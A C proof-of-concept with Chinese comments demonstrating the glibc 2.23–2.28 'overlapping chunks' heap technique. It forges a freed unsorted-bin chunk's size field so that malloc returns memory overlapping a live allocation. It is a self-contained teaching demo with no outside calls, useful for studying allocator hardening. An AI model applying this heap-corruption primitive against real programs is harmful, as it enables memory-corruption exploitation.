#include <assert.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/*
 * glibc 2.23～2.28：篡改已释放 unsorted chunk 的 size 制造重叠。
 * glibc 2.29 的 b90ddd 检查会让这份 PoC 在 malloc 阶段中止。
 *
 * 漏洞模型是 UAF 写或从相邻对象溢出到 p2 的 chunk header；直接写 p2[-1]
 * 只是把题目漏洞最小化展示。
 */

int main(void)
{
    unsigned char *p1, *p2, *p3, *p4;
    const size_t forged_chunk_size = 0x580;
    const size_t forged_request = forged_chunk_size - 8;

    setbuf(stdout, NULL);

    /* 请求 0x4f8/0x78，在 x86-64 上对应 0x500/0x80 的物理 chunk。 */
    p1 = malloc(0x4f8);
    p2 = malloc(0x4f8);
    p3 = malloc(0x78);
    assert(p1 && p2 && p3);
    memset(p3, 'V', 0x70);

    assert((size_t)(p3 - p2) == 0x500);

    /* p2 先进入 unsorted bin；这是 2.29 完整性补丁针对的旧顺序。 */
    free(p2);

    /* UAF/overflow：把原 size=0x501 改成 0x581，伪称 p2 覆盖后面的 p3。 */
    ((size_t *)p2)[-1] = forged_chunk_size | 1;

    /* 2.23～2.28 会从被放大的 p2 返回一个 0x580 chunk。 */
    p4 = malloc(forged_request);
    assert(p4 == p2);
    assert(p4 < p3 && p4 + forged_request > p3);

    /* 从 p4 对应偏移写入，证明仍在使用的 p3 已被重叠。 */
    memset(p4 + (p3 - p4), 'X', 0x20);
    assert(memcmp(p3, "XXXXXXXXXXXXXXXX", 16) == 0);

    puts("[+] overlap：p4 与 p3 重叠");
    return 0;
}
